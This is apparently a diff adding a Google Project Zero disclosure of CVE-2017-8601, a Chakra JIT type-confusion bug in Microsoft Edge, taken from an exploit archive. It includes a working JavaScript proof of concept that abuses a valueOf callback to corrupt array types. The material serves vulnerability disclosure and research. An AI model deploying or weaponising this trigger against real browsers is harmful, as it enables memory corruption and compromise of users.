@@ -1,0 +1,50 @@
+id: 28294
+date: 08/17/2017
+title: Microsoft Edge Chakra Incorrect Jit Optimization Exploit
+author: Google Security Research
+cves: CVE-2017-8601
+
+Microsoft Edge: Chakra: incorrect jit optimization with TypedArray setter #3
+
+CVE-2017-8601
+
+
+Coincidentally, Microsoft released the patch for the <a href="/p/project-zero/issues/detail?id=1290" title="Microsoft Edge: Chakra: incorrect jit optimization with TypedArray setter #2" class="closed_ref" rel="nofollow"> issue 1290 </a> the day after I reported it. But it seems they fixed it incorrectly again.
+
+This time, "func(a, b, i);" is replaced with "func(a, b, {});".
+
+PoC:
+'use strict';
+
+function func(a, b, c) {
+    a[0] = 1.2;
+    b[0] = c;
+    a[1] = 2.2;
+    a[0] = 2.3023e-320;
+}
+
+function main() {
+    let a = [1.1, 2.2];
+    let b = new Uint32Array(100);
+
+    for (let i = 0; i < 0x1000; i++)
+        func(a, b, {});  // <<---------- REPLACED
+
+    func(a, b, {valueOf: () => {
+        a[0] = {};
+
+        return 0;
+    }});
+
+    a[0].toString();
+}
+
+main();
+
+Tested on Microsoft Edge 40.15063.0.0(Insider Preview).
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse
+or a patch has been made broadly available, the bug report will become
+visible to the public.
+
+#  0day.today [2023-03-24]  #
